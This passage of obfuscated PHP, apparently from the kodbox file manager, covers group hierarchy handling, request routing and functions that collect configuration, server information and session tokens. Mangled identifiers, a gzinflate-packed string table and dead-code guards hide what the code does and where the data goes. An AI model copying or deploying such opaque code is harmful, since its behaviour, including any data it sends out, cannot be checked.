‘[$Ûï“Öş[589]] = str_replace($Ûï“Öş[592], $Ûï“Öş[8], $´şááùÓ); } unset($”Óãà ‘); } private function _listAppendSourceRoot(&$÷ Ë“ ª, $×ÊùÎµ½) { $‡ñÑÇ— =& $_SERVER[ìïæ“œî]; $ÊßÖ´±› = Model($‡ñÑÇ—[873])->listSourceRoot(SourceModel::TYPE_GROUP, $×ÊùÎµ½); $ÊßÖ´±› = array_to_keyvalue($ÊßÖ´±›, $‡ñÑÇ—[569]); $ÊßÖ´±› = array_remove_key($ÊßÖ´±›, $‡ñÑÇ—[569]); foreach ($÷ Ë“ ª as &$ÌéÒµŞ‰) { $ÌéÒµŞ‰[$‡ñÑÇ—[90]] = $ÊßÖ´±›[$ÌéÒµŞ‰[$‡ñÑÇ—[1946]]] ? $ÊßÖ´±›[$ÌéÒµŞ‰[$‡ñÑÇ—[1946]]] : array(); } unset($ÌéÒµŞ‰); } protected function groupMerge($–®ƒ¢€ ) { $–®ƒ¢€  = array_values(array_unique($–®ƒ¢€ )); $ØÖ½·›Û = array(); for ($±ÏÏ»ï’ = 0; $±ÏÏ»ï’ < count($–®ƒ¢€ ); $±ÏÏ»ï’++) { $Ö–‡–ü‡ = !1; for ($Ù¸ò†Ï­ = 0; $Ù¸ò†Ï­ < count($–®ƒ¢€ ); $Ù¸ò†Ï­++) { if ($±ÏÏ»ï’ == $Ù¸ò†Ï­) { continue; } if ($this->isParentOf($–®ƒ¢€ [$Ù¸ò†Ï­], $–®ƒ¢€ [$±ÏÏ»ï’])) { $Ö–‡–ü‡ = !0; break; } } if (!$Ö–‡–ü‡) { $ØÖ½·›Û[] = $–®ƒ¢€ [$±ÏÏ»ï’]; } } return $ØÖ½·›Û; } protected function isParentOf($ÏŒÁÄ±Ú, $½¦àà‚¦) { $Ûó¦×½Ô =& $_SERVER[ìïæ“œî]; if (!$ÏŒÁÄ±Ú || !$½¦àà‚¦ || $ÏŒÁÄ±Ú == $½¦àà‚¦) { return !1; } $âÇ“ß÷¬ = $this->getInfoSimple($ÏŒÁÄ±Ú); $Ì–¬™×¾ = $this->getInfoSimple($½¦àà‚¦); $àßéÊÛ = $âÇ“ß÷¬[$Ûó¦×½Ô[584]] . $ÏŒÁÄ±Ú . $Ûó¦×½Ô[50]; if (substr($Ì–¬™×¾[$Ûó¦×½Ô[584]], 0, strlen($àßéÊÛ)) == $àßéÊÛ) { return !0; } return !1; } public function groupShowRoot($©ÄÓøíÕ, $ÁùÒ¢Â¬ = false) { $ÍíœšÍï =& $_SERVER[ìïæ“œî]; $ïçé±ÌÄ = $this->getInfo($©ÄÓøíÕ); if (!$ïçé±ÌÄ) { return array(); } $¨Ş½òİŸ = $this->parentLevelArray($ïçé±ÌÄ[$ÍíœšÍï[584]]); $—¶‘…íŠ = array($©ÄÓøíÕ); if (count($¨Ş½òİŸ) == 0) { return $—¶‘…íŠ; } if ($ÁùÒ¢Â¬ && count($¨Ş½òİŸ) == 1) { return $—¶‘…íŠ; } if (!$ïçé±ÌÄ[$ÍíœšÍï[539]] || !isset($ïçé±ÌÄ[$ÍíœšÍï[539]][$ÍíœšÍï[2036]]) || $ïçé±ÌÄ[$ÍíœšÍï[539]][$ÍíœšÍï[2036]] == $ÍíœšÍï[825]) { return $this->groupShowRoot($¨Ş½òİŸ[count($¨Ş½òİŸ) - 1], $ÁùÒ¢Â¬); } if ($ïçé±ÌÄ[$ÍíœšÍï[539]][$ÍíœšÍï[2036]] == $ÍíœšÍï[433]) { $×òëÉÏ½ = explode($ÍíœšÍï[50], $ïçé±ÌÄ[$ÍíœšÍï[539]][$ÍíœšÍï[2037]]); if ($×òëÉÏ½) { $—¶‘…íŠ = array_merge($—¶‘…íŠ, $×òëÉÏ½); } } return $—¶‘…íŠ; } protected function resetParentLevel() { $Ï›ú¨¶³ =& $_SERVER[ìïæ“œî]; $ÅŸ¿´Æ = $Ï›ú¨¶³[1946]; $òõç¡ş‹ = $this->select(); $òõç¡ş‹ = array_to_keyvalue($òõç¡ş‹, $ÅŸ¿´Æ); foreach ($òõç¡ş‹ as $ö–´Õ“) { $óíÀõÇĞ = $ö–´Õ“; $Òó°Â¦ö = array(); while ($óíÀõÇĞ[$Ï›ú¨¶³[192]] != 0) { $Òó°Â¦ö[] = $óíÀõÇĞ[$Ï›ú¨¶³[192]]; $óíÀõÇĞ = $òõç¡ş‹[$óíÀõÇĞ[$Ï›ú¨¶³[192]]]; } $Òó°Â¦ö[] = 0; $Òó°Â¦ö = $Ï›ú¨¶³[50] . implode($Ï›ú¨¶³[50], array_reverse($Òó°Â¦ö)) . $Ï›ú¨¶³[50]; $this->setNamePinyin($ö–´Õ“[$ÅŸ¿´Æ], $ö–´Õ“[$Ï›ú¨¶³[32]]); $this->where(array($ÅŸ¿´Æ => $ö–´Õ“[$ÅŸ¿´Æ]))->save(array($Ï›ú¨¶³[652] => $Òó°Â¦ö)); } return $òõç¡ş‹; } public function groupNameAuto($¿î¼½½ş, $ÉãöóØ) { $‹èêÃß =& $_SERVER[ìïæ“œî]; $Á¤Æë = $this->where(array($‹èêÃß[477] => $¿î¼½½ş))->getField($‹èêÃß[32], !0); if (!$Á¤Æë || !in_array($ÉãöóØ, $Á¤Æë)) { return $ÉãöóØ; } for ($¸«®ŞçÄ = 1; $¸«®ŞçÄ <= count($Á¤Æë) + 1; $¸«®ŞçÄ++) { $¸†ÊÄıã = $ÉãöóØ . "\x28{$¸«®ŞçÄ}\51"; if (!in_array($¸†ÊÄıã, $Á¤Æë)) { return $¸†ÊÄıã; } } } public function groupSwitch($èÇ²€, $Í¶Ê™ÛĞ) { $Ç½­‘³˜ =& $_SERVER[ìïæ“œî]; $—úô”´í = array($Ç½­‘³˜[1946] => array($Ç½­‘³˜[7], array($èÇ²€, $Í¶Ê™ÛĞ))); $Å€ÍÌ‰¼ = $this->where($—úô”´í)->select(); $Å€ÍÌ‰¼ = array_to_keyvalue($Å€ÍÌ‰¼, $Ç½­‘³˜[1946]); if (!isset($Å€ÍÌ‰¼[$èÇ²€]) || !isset($Å€ÍÌ‰¼[$Í¶Ê™ÛĞ]) || $Å€ÍÌ‰¼[$èÇ²€][$Ç½­‘³˜[192]] == 0) { return !1; } $—úô”´í = array($Ç½­‘³˜[1946] => $èÇ²€); $ ¶ÏªßÉ = Model($Ç½­‘³˜[2040])->where($—úô”´í)->select(); if (!$ ¶ÏªßÉ) { $ ¶ÏªßÉ = array(); } foreach ($ ¶ÏªßÉ as $‡ìèî·ê) { $‚ò¥‘îö = $‡ìèî·ê[$Ç½­‘³˜[1747]]; $—úô”´í = array($Ç½­‘³˜[1747] => $‚ò¥‘îö, $Ç½­‘³˜[1946] => $Í¶Ê™ÛĞ); $Ş—¤ıË— = Model($Ç½­‘³˜[2040])->where($—úô”´í)->find(); if (!$Ş—¤ıË—) { $Ì©î‚ÌÁ = array($Í¶Ê™ÛĞ => $‡ìèî·ê[$Ç½­‘³˜[2054]]); Model($Ç½­‘³˜[598])->userGroupAdd($‚ò¥‘îö, $Ì©î‚ÌÁ); } Model($Ç½­‘³˜[598])->userGroupRemove($‚ò¥‘îö, $èÇ²€); } $—úô”´í = array($Ç½­‘³˜[190] => 2, $Ç½­‘³˜[192] => 0, $Ç½­‘³˜[485] => 1, $Ç½­‘³˜[569] => array($Ç½­‘³˜[7], array($èÇ²€, $Í¶Ê™ÛĞ))); $“ñ¸ÇŸÂ = Model($Ç½­‘³˜[873])->where($—úô”´í)->field($Ç½­‘³˜[2055])->select(); $“ñ¸ÇŸÂ = array_to_keyvalue($“ñ¸ÇŸÂ, $Ç½­‘³˜[569], $Ç½­‘³˜[193]); $œ·Ş¶Ş = !empty($“ñ¸ÇŸÂ[$èÇ²€]) ? $“ñ¸ÇŸÂ[$èÇ²€] : !1; if ($œ·Ş¶Ş) { if (!$“ñ¸ÇŸÂ[$Í¶Ê™ÛĞ]) { $“ñ¸ÇŸÂ[$Í¶Ê™ÛĞ] = Model($Ç½­‘³˜[873])->groupRootAdd($Í¶Ê™ÛĞ); } $â”É×úÒ = $“ñ¸ÇŸÂ[$Í¶Ê™ÛĞ]; $—úô”´í = array($Ç½­‘³˜[192] => $œ·Ş¶Ş); $“ñ¸ÇŸÂ = Model($Ç½­‘³˜[873])->where($—úô”´í)->field($Ç½­‘³˜[2056])->select(); if (!$“ñ¸ÇŸÂ) { $“ñ¸ÇŸÂ = array(); } Model($Ç½­‘³˜[873])->moveClearAuth = !1; foreach ($“ñ¸ÇŸÂ as $‡ĞæİŠ) { $ø„Ä€• = $‡ĞæİŠ[$Ç½­‘³˜[485]] == $Ç½­‘³˜[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ç½­‘³˜[873])->move($‡ĞæİŠ[$Ç½­‘³˜[193]], $â”É×úÒ, $ø„Ä€•); } Model($Ç½­‘³˜[873])->moveClearAuth = !0; $—úô”´í = array($Ç½­‘³˜[190] => 2, $Ç½­‘³˜[569] => $èÇ²€); $’Äá¢¶ä = array($Ç½­‘³˜[569] => $Í¶Ê™ÛĞ); Model($Ç½­‘³˜[2057])->where($—úô”´í)->save($’Äá¢¶ä); Model($Ç½­‘³˜[2058])->where($—úô”´í)->save($’Äá¢¶ä); } $this->_changeChildLevel($Å€ÍÌ‰¼[$èÇ²€], $Å€ÍÌ‰¼[$Í¶Ê™ÛĞ], !0); $this->where(array($Ç½­‘³˜[192] => $èÇ²€))->save(array($Ç½­‘³˜[192] => $Í¶Ê™ÛĞ)); $this->_clearChildrenCache($Å€ÍÌ‰¼[$Í¶Ê™ÛĞ]); return !0; } } goto eÈËØ¿÷Ñø; fœÑ…Ë: $_SERVER[‚ ×¹Âö] = explode($_SERVER[ìïæ“œî][680], gzinflate(substr($_SERVER[ìïæ“œî][681], 10, -8))); $bcsnuxqrip = $_SERVER[ìïæ“œî][682]; class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($ÍàÁºà) { $·±÷°ºŞ =& $_SERVER[ìïæ“œî]; $ÓºÀÙÙè =& $_SERVER[‚ ×¹Âö]; $‘ı€Ö©ê = explode($ÓºÀÙÙè[0], trim($ÍàÁºà, $ÓºÀÙÙè[0])); $this->defaultModule = $‘ı€Ö©ê[0] ? $‘ı€Ö©ê[0] : $this->defaultModule; $ÆŒ¡î¥¥ = $·±÷°ºŞ[683]; if (!$ÆŒ¡î¥¥) { die; } $this->defaultController = $‘ı€Ö©ê[1] ? $‘ı€Ö©ê[1] : $this->defaultController; $this->defaultAction = $‘ı€Ö©ê[2] ? $‘ı€Ö©ê[2] : $this->defaultAction; $İÕš¥óœ = $·±÷°ºŞ[684]; while ($İÕš¥óœ < $·±÷°ºŞ[685]) { if ($İÕš¥óœ >= 0) { break; } $İÕš¥óœ++; } $this->kcts51d59fe3($ÓºÀÙÙè[1], array($this, $ÓºÀÙÙè[2])); $‚Ö½ìÖå = $·±÷°ºŞ[686]; if (!$‚Ö½ìÖå) { return; } } public function appRun($ÔÈÉÕÑ­) { $Ÿ¨Ù““è =& $_SERVER[ìïæ“œî]; $€¿ïğ ‰ =& $_SERVER[‚ ×¹Âö]; $¬¢ĞÛƒÆ = explode($€¿ïğ ‰[0], $ÔÈÉÕÑ­); $§š° ® = strtolower($¬¢ĞÛƒÆ[0]); $ÒĞØ‘–ú = $Ÿ¨Ù““è[687]; if (strlen($ÒĞØ‘–ú) < $Ÿ¨Ù““è[688]) { return; } $’‚õì·ú = $€¿ïğ ‰[3]; $õ¡Ëô«¿ = $Ÿ¨Ù““è[689]; if ($§š° ® == $€¿ïğ ‰[4]) { $’‚õì·ú = $€¿ïğ ‰[5]; $¬¢ĞÛƒÆ[0] = $€¿ïğ ‰[6]; $¬¢ĞÛƒÆ[1] = $¬¢ĞÛƒÆ[1] . $€¿ïğ ‰[7]; $ÔÈÉÕÑ­ = join($€¿ïğ ‰[0], $¬¢ĞÛƒÆ); $ÔÈÉÕÑ­ = trim($ÔÈÉÕÑ­, $€¿ïğ ‰[0]); } call_user_func(array($€¿ïğ ‰[8], $€¿ïğ ‰[9]), $’‚õì·ú . $€¿ïğ ‰[10], $ÔÈÉÕÑ­); ActionCall($ÔÈÉÕÑ­); call_user_func(array($€¿ïğ ‰[8], $€¿ïğ ‰[9]), $’‚õì·ú . $€¿ïğ ‰[11], $ÔÈÉÕÑ­); } private function autorun() { $’åÅ™‚¢ =& $_SERVER[‚ ×¹Âö]; global $config; if (count($config[$’åÅ™‚¢[12]]) == 0) { return; } foreach ($config[$’åÅ™‚¢[12]] as $×ü¨áÒä => $Å§ÌŠ¦§) { $this->appRun($Å§ÌŠ¦§); $ğØ¤üØ¸ = $_SERVER[ìïæ“œî][690]; } } private function jbtd848f7d0f() { $ÙĞ í¾  =& $_SERVER[ìïæ“œî]; $³·ıÛ =& $_SERVER[‚ ×¹Âö]; $áø¬ûù± = $³·ıÛ[4]; $èšıåæ = $ÙĞ í¾ [691]; if (strlen($èšıåæ) < $ÙĞ í¾ [685]) { return; } $Œ£û•÷³ = $GLOBALS[$³·ıÛ[13]][$³·ıÛ[14]][0]; if (!$Œ£û•÷³ || strlen($Œ£û•÷³) <= strlen($áø¬ûù±)) { return; } if (strtolower(substr($Œ£û•÷³, -strlen($áø¬ûù±))) != $áø¬ûù±) { return; } $çÃÕ¼òÍ = substr($Œ£û•÷³, 0, -strlen($áø¬ûù±)); $ÑÉ•ªï¬ = array($³·ıÛ[4], $çÃÕ¼òÍ); $·ïæ­×» = array_slice($GLOBALS[$³·ıÛ[13]][$³·ıÛ[14]], 1); $É®õœÚ = $ÙĞ í¾ [692]; while ($É®õœÚ < $ÙĞ í¾ [688]) { if ($É®õœÚ >= 0) { break; } $É®õœÚ++; } $GLOBALS[$³·ıÛ[13]][$³·ıÛ[14]] = array_merge($ÑÉ•ªï¬, $·ïæ­×»); $GLOBALS[$³·ıÛ[13]][$³·ıÛ[15]] = implode($³·ıÛ[0], $GLOBALS[$³·ıÛ[13]][$³·ıÛ[14]]); $×¢‚£ƒÂ = $ÙĞ í¾ [693]; } private function umrs616540c8() { $×ó¥œÓ¶ =& $_SERVER[ìïæ“œî]; $ÃÚÀ¹ =& $_SERVER[‚ ×¹Âö]; if ($GLOBALS[$ÃÚÀ¹[13]][$ÃÚÀ¹[15]] != $ÃÚÀ¹[6]) { return; } $›î¤¸ŒÙ = $_SERVER[$ÃÚÀ¹[16]]; $Ë‚˜¾ø† = $ÃÚÀ¹[17]; $¹ùÙÙÌ¢ = $×ó¥œÓ¶[694]; while (strlen($¹ùÙÙÌ¢) < $×ó¥œÓ¶[688]) { if (!$¹ùÙÙÌ¢) { break; } $¹ùÙÙÌ¢++; } if (!strstr($›î¤¸ŒÙ, $Ë‚˜¾ø†)) { return; } $÷³ø¢ƒŸ = strrpos($›î¤¸ŒÙ, $Ë‚˜¾ø†); $†ËÇ¿È = substr($›î¤¸ŒÙ, $÷³ø¢ƒŸ + strlen($Ë‚˜¾ø†)); $äØÑ¡Õ» = $×ó¥œÓ¶[695]; if (!$äØÑ¡Õ») { return; } preg_match_all($ÃÚÀ¹[18], $†ËÇ¿È, $Ü¶£µûÃ); $†ËÇ¿È = trim($Ü¶£µûÃ[0][0], $ÃÚÀ¹[19]); $GLOBALS[$ÃÚÀ¹[13]][$ÃÚÀ¹[14]] = explode($ÃÚÀ¹[19], $†ËÇ¿È); $îû¼Æ¤ = $×ó¥œÓ¶[696]; $GLOBALS[$ÃÚÀ¹[13]][$ÃÚÀ¹[15]] = implode($ÃÚÀ¹[0], $GLOBALS[$ÃÚÀ¹[13]][$ÃÚÀ¹[14]]); $¸¤Çïˆ = $×ó¥œÓ¶[697]; if (!$¸¤Çïˆ) { die; } } public function run() { $˜ê‡¤ =& $_SERVER[ìïæ“œî]; $­¢öÅ‰â =& $_SERVER[‚ ×¹Âö]; $this->umrs616540c8(); $this->jbtd848f7d0f(); $Ÿ±í¸éã = $˜ê‡¤[698]; $¤ãü¨å™ = $GLOBALS[$­¢öÅ‰â[13]][$­¢öÅ‰â[14]]; $éé¿¼âŞ = $GLOBALS[$­¢öÅ‰â[13]][$­¢öÅ‰â[15]]; $¾ëü‚Ğœ = $˜ê‡¤[699]; define($­¢öÅ‰â[20], isset($¤ãü¨å™[0]) && $¤ãü¨å™[0] ? $¤ãü¨å™[0] : $this->defaultModule); $„ìî½ü… = $˜ê‡¤[700]; define($­¢öÅ‰â[21], isset($¤ãü¨å™[1]) && $¤ãü¨å™[0] ? $¤ãü¨å™[1] : $this->defaultController); $ÃÌûüİ = $˜ê‡¤[701]; if (strlen($ÃÌûüİ) < $˜ê‡¤[702]) { return; } define($­¢öÅ‰â[22], isset($¤ãü¨å™[2]) && $¤ãü¨å™[0] ? $¤ãü¨å™[2] : $this->defaultAction); define($­¢öÅ‰â[23], MOD . $­¢öÅ‰â[0] . ST . $­¢öÅ‰â[0] . ACT); $™¨õĞÕÁ = $˜ê‡¤[703]; $_SERVER[$­¢öÅ‰â[24]] = strtolower(ACTION); $this->autorun(); if (count($¤ãü¨å™) >= 3) { $this->appRun($éé¿¼âŞ); } else { $this->appRun(ACTION); } } private $xmse874add0a = array(); private $rdauebf1f699 = ''; public function cijp88d2366c() { $»ÃÉåâÎ =& $_SERVER[ìïæ“œî]; $®Ğ¿ŸÙ– =& $_SERVER[‚ ×¹Âö]; $this->nbpj06076ed6(); $this->xjat1cdc0de7(); $«˜íñ¶ = $»ÃÉåâÎ[704]; if (!$«˜íñ¶) { die; } $this->vbxl02db5c31(); $ºŒà¤ = $»ÃÉåâÎ[705]; if (strlen($ºŒà¤) < $»ÃÉåâÎ[688]) { die; } $this->brmaca4c426a(); $this->sagk6b3fed0f(); $this->hjmq8d1440b5(); $Ì¯¾şØ® = $»ÃÉåâÎ[706]; if (!$Ì¯¾şØ®) { die; } $this->mlsvabee77c2(); $this->kcts51d59fe3($®Ğ¿ŸÙ–[25], array($this, $®Ğ¿ŸÙ–[26])); $this->kcts51d59fe3($®Ğ¿ŸÙ–[27], array($this, $®Ğ¿ŸÙ–[28])); $ƒÃĞ›Ø¬ = $»ÃÉåâÎ[707]; if (strlen($ƒÃĞ›Ø¬) < $»ÃÉåâÎ[685]) { return; } $this->kcts51d59fe3($®Ğ¿ŸÙ–[29], array($this, $®Ğ¿ŸÙ–[30])); $ñšõåŠ = $»ÃÉåâÎ[708]; if (!$ñšõåŠ) { die; } $this->kcts51d59fe3($®Ğ¿ŸÙ–[31], array($this, $®Ğ¿ŸÙ–[32])); $Š€ÈäÑ = $»ÃÉåâÎ[709]; while (strlen($Š€ÈäÑ) < $»ÃÉåâÎ[710]) { if (!$Š€ÈäÑ) { break; } $Š€ÈäÑ++; } } public function gqoe366aea6f($Ê•Õ±Ğ) { $ªÜïŞš¢ =& $_SERVER[ìïæ“œî]; $™ÓŸÈÅ  =& $_SERVER[‚ ×¹Âö]; $¢²İ‚º³ = Model($™ÓŸÈÅ [33])->get(); $”ÒÔĞ®Ú = $ªÜïŞš¢[711]; if (!$”ÒÔĞ®Ú) { return; } $ı˜» •– = array($™ÓŸÈÅ [34], $™ÓŸÈÅ [35], $™ÓŸÈÅ [36], $™ÓŸÈÅ [37], $™ÓŸÈÅ [38], $™ÓŸÈÅ [39], $™ÓŸÈÅ [40], $™ÓŸÈÅ [41], $™ÓŸÈÅ [42], $™ÓŸÈÅ [43], $™ÓŸÈÅ [44], $™ÓŸÈÅ [45], $™ÓŸÈÅ [46], $™ÓŸÈÅ [47], $™ÓŸÈÅ [48], $™ÓŸÈÅ [49], $™ÓŸÈÅ [50], $™ÓŸÈÅ [51], $™ÓŸÈÅ [52], $™ÓŸÈÅ [53], $™ÓŸÈÅ [54], $™ÓŸÈÅ [55], $™ÓŸÈÅ [56], $™ÓŸÈÅ [57], $™ÓŸÈÅ [58], $™ÓŸÈÅ [59], $™ÓŸÈÅ [60], $™ÓŸÈÅ [61], $™ÓŸÈÅ [62], $™ÓŸÈÅ [63], $™ÓŸÈÅ [64], $™ÓŸÈÅ [65], $™ÓŸÈÅ [66], $™ÓŸÈÅ [67], $™ÓŸÈÅ [68], $™ÓŸÈÅ [69], $™ÓŸÈÅ [70], $™ÓŸÈÅ [71], $™ÓŸÈÅ [72], $™ÓŸÈÅ [73], $™ÓŸÈÅ [74], $™ÓŸÈÅ [75], $™ÓŸÈÅ [76], $™ÓŸÈÅ [77], $™ÓŸÈÅ [78], $™ÓŸÈÅ [79], $™ÓŸÈÅ [80], $™ÓŸÈÅ [81], $™ÓŸÈÅ [82], $™ÓŸÈÅ [83], $™ÓŸÈÅ [84], $™ÓŸÈÅ [85]); foreach ($ı˜» •– as $¤íâ«Íª) { $¿êĞı¼ñ = $GLOBALS[$™ÓŸÈÅ [86]][$™ÓŸÈÅ [87]][$¤íâ«Íª]; if (isset($¢²İ‚º³[$¤íâ«Íª])) { $¿êĞı¼ñ = $¢²İ‚º³[$¤íâ«Íª]; } $Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$¤íâ«Íª] = $¿êĞı¼ñ; } $·´º¬„ = $Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$™ÓŸÈÅ [46]]; $œüìÇ¼ = $ªÜïŞš¢[712]; while ($œüìÇ¼ < $ªÜïŞš¢[713]) { if ($œüìÇ¼ >= 0) { break; } $œüìÇ¼++; } unset($Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [90]][$™ÓŸÈÅ [91]]); unset($Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [90]][$™ÓŸÈÅ [92]]); unset($Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$™ÓŸÈÅ [46]]); $ĞøÙÆ = $ªÜïŞš¢[714]; while (strlen($ĞøÙÆ) < $ªÜïŞš¢[702]) { if (!$ĞøÙÆ) { break; } $ĞøÙÆ++; } unset($Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$™ÓŸÈÅ [93]]); $Ê“‰ıÔ = $ªÜïŞš¢[715]; if (strlen($Ê“‰ıÔ) < $ªÜïŞš¢[713]) { die; } $Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$™ÓŸÈÅ [94]] = array($™ÓŸÈÅ [95] => (int) $·´º¬„[$™ÓŸÈÅ [96]], $™ÓŸÈÅ [97] => (int) _get($·´º¬„, $™ÓŸÈÅ [98], 0)); $…öôİ±¯ = substr(md5($™ÓŸÈÅ [99] . get_client_ip() . $¢²İ‚º³[$™ÓŸÈÅ [100]]), 0, 15); $ËÆ–áœ = $ªÜïŞš¢[716]; $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [102]] = Mcrypt::encode(Session::sign(), $…öôİ±¯, 3600 * 24); $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [103]] = Action($™ÓŸÈÅ [104])->accessToken(); $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [105]] = md5($_SERVER[$™ÓŸÈÅ [106]] . $¢²İ‚º³[$™ÓŸÈÅ [100]]); $Ûîù¿ş‚ = $ªÜïŞš¢[717]; if (!$Ûîù¿ş‚) { return; } $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [107]] = base64_encode(serverInfo()); $şƒĞæÀ£ = $ªÜïŞš¢[718]; $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [108]] = $this->rdauebf1f699; $º¬Šéº² = $ªÜïŞš¢[719]; if (!$º¬Šéº²) { return; } if ($¢²İ‚º³[$™ÓŸÈÅ [108]] != $™ÓŸÈÅ [109]) { $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [110]] = $¢²İ‚º³[$™ÓŸÈÅ [110]]; $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [111]] = $¢²İ‚º³[$™ÓŸÈÅ [111]]; $ÓíÒ©Á¶ = rand_string(10) . $this->rdauebf1f699 . rand_string(5); $Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [112]][$™ÓŸÈÅ [113]] = $this->xpzbe01e586c($ÓíÒ©Á¶, $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [105]]); } if ($this->rdauebf1f699 == $™ÓŸÈÅ [109]) { $Ê•Õ±Ğ[$™ÓŸÈÅ [88]][$™ÓŸÈÅ [89]][$™ÓŸÈÅ [94]][$™ÓŸÈÅ [98]] = 0; } $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [114]] = $this->versionPluginFilter(); $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [115]] = _get($this->xmse874add0a, $™ÓŸÈÅ [116], $™ÓŸÈÅ [6]); $Ëªı¢ƒà = $ªÜïŞš¢[720]; if (KodUser::isRoot() && $this->config[$™ÓŸÈÅ [117]]) { $Ê•Õ±Ğ[$™ÓŸÈÅ [101]][$™ÓŸÈÅ [118]] = WEB_ROOT; } return $Ê•Õ±Ğ; } private function hjmq8d1440b5() { $‡‰…õÍ¨ =& $_SERVER[ìïæ“œî]; $ä„•–Ôå =& $_SERVER[‚ ×¹Âö]; $¯ºö•¿˜ = $_SERVER[$ä„•–Ôå[24]] == $ä„•–Ôå[119]; if ($_SERVER[$ä„•–Ôå[24]] == $ä„•–Ôå[120] && $_GET[$ä„•–Ôå[121]] == $ä„•–Ôå[122]) { $¯ºö•¿˜ = !0; } if ($¯ºö•¿˜) { $Æ’©²«Ò = array($ä„•–Ôå[108] => $this->rdauebf1f699, $ä„•–Ôå[123] => $this->xlytd9dc25f6(), $ä„•–Ôå[124] => Model($ä„•–Ôå[125])->count()); if ($this->rdauebf1f699 != $ä„•–Ôå[109]) { $Ó¦™“øæ = _get($this->xmse874add0a, $ä„•–Ôå[126]); if ($Ó¦™“øæ) { $Æ’©²«Ò[$ä„•–Ôå[127]] = $Ó¦™“øæ; $Æ’©²«Ò[$ä„•–Ôå[128]] = strtotime(_get($this->xmse874add0a, $ä„•–Ôå[129])); $Æ’©²«Ò[$ä„•–Ôå[130]] = _get($this->xmse874add0a, $ä„•–Ôå[116]); } $Ç–Œ»åÇ = Model($ä„•–Ôå[33])->get($ä„•–Ôå[131], $ä„•–Ôå[6], !0); if (is_string($Ç–Œ»åÇ) && substr($Ç–Œ»åÇ, 0, 1) == $ä„•–Ôå[132]) { $Ç–Œ»åÇ = json_decode_force($Ç–Œ»åÇ); } if (is_array($Ç–Œ»åÇ) && $Ç–Œ»åÇ[$ä„•–Ôå[133]] && strstr($Ç–Œ»åÇ[$ä„•–Ôå[133]], $ä„•–Ôå[134])) { $ä—¢À• = explode($ä„•–Ôå[134], $Ç–Œ»åÇ[$ä„•–Ôå[133]]); $Æ’©²«Ò[$ä„•–Ôå[135]] = $ä—¢À•[0]; } } $Æ’©²«Ò = $this->jgtl93e43aee(json_encode($Æ’©²«Ò), md5($ä„•–Ôå[136])); $Ãè•Êü = $‡‰…õÍ¨[721]; $¡šŸğÕ» = array($ä„•–Ôå[137] => $Æ’©²«Ò); call_user_func(array($ä„•–Ôå[138], $ä„•–Ôå[139]), $¡šŸğÕ»); $Èè¦Ôì = $‡‰…õÍ¨[722]; if (strlen($Èè¦Ôì) < $‡‰…õÍ¨[710]) { return; } } if ($this->rdauebf1f699 == $ä„•–Ôå[109]) { return; } $óšÇè“ã = array($ä„•–Ôå[140], $ä„•–Ôå[141], $ä„•–Ôå[142], $ä„•–Ôå[143], $ä„•–Ôå[144], $ä„•–Ôå[145]); $êÑùßÑ„ = $‡‰…õÍ¨[723]; if (!$êÑùßÑ„) { return; } $†ñ¿áŞ = Model($ä„•–Ôå[33])->get(); $³Œö¦¡è = $‡‰…õÍ¨[724]; $¡šŸğÕ» = array($ä„•–Ôå[146] => $†ñ¿áŞ[$ä„•–Ôå[34]], $ä„•–Ôå[147] => $†ñ¿áŞ[$ä„•–Ôå[35]], $ä„•–Ôå[148] => $ä„•–Ôå[6]); foreach ($óšÇè“ã as $Œ¿ˆÆù«) { if (!isset($†ñ¿áŞ[$Œ¿ˆÆù«]) || !$†ñ¿áŞ[$Œ¿ˆÆù«]) { continue; } $¡šŸğÕ»[$Œ¿ˆÆù«] = $†ñ¿áŞ[$Œ¿ˆÆù«]; } call_user_func(array($ä„•–Ôå[138], $ä„•–Ôå[139]), $¡šŸğÕ»); $›ßËî€Õ = $‡‰…õÍ¨[725]; if (!$›ßËî€Õ) { die; } } private function brmaca4c426a() { $ĞÇç…´” =& $_SERVER[ìïæ“œî]; $Ú×ĞÂ§Ü =& $_SERVER[‚ ×¹Âö]; if ($_SERVER[$Ú×ĞÂ§Ü[24]] != $Ú×ĞÂ§Ü[149]) { return; } if (!KodUser::isRoot()) { die; } $¢èùÂğè = $GLOBALS[$Ú×ĞÂ§Ü[13]]; if (isset($¢èùÂğè[$Ú×ĞÂ§Ü[150]])) { $this->bgmrc0925713(); die; } if (isset($¢èùÂğè[$Ú×ĞÂ§Ü[151]]) && isset($¢èùÂğè[$Ú×ĞÂ§Ü[151]]) == $Ú×ĞÂ§Ü[122]) { $¢èùÂğè[$Ú×ĞÂ§Ü[152]] = Model($Ú×ĞÂ§Ü[33])->get($Ú×ĞÂ§Ü[153]); } if (!isset($¢èùÂğè[$Ú×ĞÂ§Ü[152]]) || strlen($¢èùÂğè[$Ú×ĞÂ§Ü[152]]) != 16) { show_json($Ú×ĞÂ§Ü[154] . 